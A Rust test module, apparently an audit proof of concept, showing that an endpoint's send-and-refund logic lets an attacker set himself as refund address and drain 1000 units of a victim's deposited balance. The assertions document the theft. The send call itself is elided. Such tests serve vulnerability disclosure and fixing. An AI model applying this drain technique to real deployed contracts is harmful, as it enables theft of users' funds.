#[cfg(test)]
mod test {
    use super::*;
    use crate::endpoint_setup::setup;
    use crate::fixtures::{create_attacker_victim, DEFAULT_SEND_LIB};
    use sora_sdk::{BytesN, MessagingParams};

    #[test]
    fn poc_refund_drains_unrelated_balance() {
        let (context, endpoint_client) = setup();
        let (attacker, victim) = create_attacker_victim();

        let native_fee: u64 = 100;
        let zro_fee: u64 = 0;
        let dst_eid: u64 = 2;
        context.setup_send_lib(dst_eid, native_fee, zro_fee);

        context.fund_endpoint(victim, 1000);
        context.fund_endpoint(attacker, native_fee);

        let refund_address = attacker;
        let params = DEFAULT_SEND_LIB;

        // Call send with attacker as sender.
        context.mock_auth(attacker, "send", (attacker, &params, &refund_address));
        endpoint_client.send(...);

        // Assert that the fee_recipient got 100 and attacker refund received 1000 (victim funds).
        assert_eq!(context.get_fee_recipient_balance(), 100);
        assert_eq!(context.get_attacker_balance(refund_address), 1000);
        assert_eq!(context.get_endpoint_balance(), 0);
    }
}
